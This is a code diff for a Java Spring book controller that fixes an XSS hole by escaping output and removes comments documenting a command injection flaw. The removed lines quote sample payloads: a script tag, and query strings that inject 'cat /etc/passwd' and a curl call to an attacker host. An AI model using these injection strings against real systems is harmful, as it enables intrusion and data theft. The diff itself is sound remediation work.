@@ -6,6 +6,7 @@ import lombok.RequiredArgsConstructor;
 import org.springframework.http.HttpStatus;
 import org.springframework.http.ResponseEntity;
 import org.springframework.web.bind.annotation.*;
+import org.springframework.web.util.HtmlUtils;
 
 import java.util.List;
 
@@ -76,22 +77,15 @@ public class BookController {
 
     /**
      * Render a book's description as HTML.
-     *
-     * ⚠️ VULNERABILITY: Cross-Site Scripting (XSS) — the book description is
-     * embedded directly into an HTML response without escaping. If a book's
-     * description contains JavaScript (e.g., <script>alert(1)</script>), it
-     * will execute in the victim's browser.
-     *
-     * This is an obvious XSS vulnerability — user-controlled data rendered as HTML.
+     * All user-controlled fields are HTML-escaped before embedding to prevent XSS.
      */
     @GetMapping("/{id}/render-description")
     public ResponseEntity<String> renderDescription(@PathVariable Long id) {
         return bookService.getBookById(id).map(book -> {
-            // ⚠️ VULNERABILITY: unescaped user content embedded in HTML
             String html = "<html><body>" +
-                          "<h1>" + book.getTitle() + "</h1>" +
-                          "<h2>by " + book.getAuthor() + "</h2>" +
-                          "<div class=\"description\">" + book.getDescription() + "</div>" +
+                          "<h1>" + HtmlUtils.htmlEscape(book.getTitle()) + "</h1>" +
+                          "<h2>by " + HtmlUtils.htmlEscape(book.getAuthor()) + "</h2>" +
+                          "<div class=\"description\">" + HtmlUtils.htmlEscape(book.getDescription()) + "</div>" +
                           "</body></html>";
             return ResponseEntity.ok()
                     .header("Content-Type", "text/html")
@@ -101,17 +95,10 @@ public class BookController {
 
     /**
      * Export book data in the specified format (csv, json, xml).
-     *
-     * ⚠️ VULNERABILITY: Command Injection — the 'format' parameter is passed
-     * to BookService.exportBookData() which passes it to Runtime.exec().
-     *
-     * Example exploit:
-     *   GET /api/books/export?format=csv;+cat+/etc/passwd
-     *   GET /api/books/export?format=csv+%26%26+curl+http://attacker.com/$(whoami)
+     * The format is validated against an allowlist in the service layer.
      */
     @GetMapping("/export")
     public ResponseEntity<String> exportBooks(@RequestParam("format") String format) {
-        // TODO: validate format parameter against allowlist
         String result = bookService.exportBookData(format);
         return ResponseEntity.ok(result);
     }
